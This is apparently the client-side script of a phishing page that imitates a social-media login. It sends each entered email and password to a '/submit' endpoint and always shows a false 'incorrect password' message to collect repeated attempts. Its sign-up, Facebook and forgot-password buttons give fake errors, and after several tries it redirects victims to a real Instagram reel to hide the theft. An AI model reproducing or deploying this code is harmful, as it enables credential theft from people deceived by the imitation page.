document.addEventListener('DOMContentLoaded', () => {
    const popup = document.getElementById('popup');

    document.getElementById('closebtn').addEventListener('click', () =>{
      popup.style.display = 'none'; 
    });

    window.onload = function() {
      popup.style.display = 'flex';
    };

    const form = document.getElementById('form'); 
    const emailInput = document.getElementById('email'); 
    const passInput = document.getElementById('pass'); 
    const msgbox = document.getElementById("wrongmsg");
    const fbup = document.getElementById("fbup");
    const signup = document.getElementById("signup");
    const fpassword = document.getElementById('fpassword');
    let count = 0;
    let extra = 2;
    let end = count + extra;
    
    signup.addEventListener("click", () => {
      msgbox.innerHTML= `Cannot Sign Up at the moment,<br> Please try again later`
    });

    fbup.addEventListener("click", () => {
      msgbox.innerHTML = `Cannot Connect to Facebook ,<br> Please try again later`
    });

    fpassword.addEventListener('click', function () {
      msgbox.innerHTML = `Server Connection Not Stable,<br> Please try again later`
      extra += 1;
      end = count + extra;
    });
  
    form.addEventListener('submit', async (event) => {
      event.preventDefault();
      msgbox.innerHTML = `Incorrect Username or Password,<br> Please try again later`
     
      const data = {
        email: emailInput.value,
        pass: passInput.value,
      };
      const response = await fetch('/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data), 
      });
      
      if (count >= end) {
        if (response.ok) {
          window.location.href = 'https://www.instagram.com/reel/DEVKzcyzVen/?utm_source=ig_web_copy_link';
          count = 0;
          extra = 2;
          end = count + extra;
        } else {
          console.error('Error: Server responded with a failure status.');
        }
      } 
      else {
        count += 1;
      }
    });
  });
  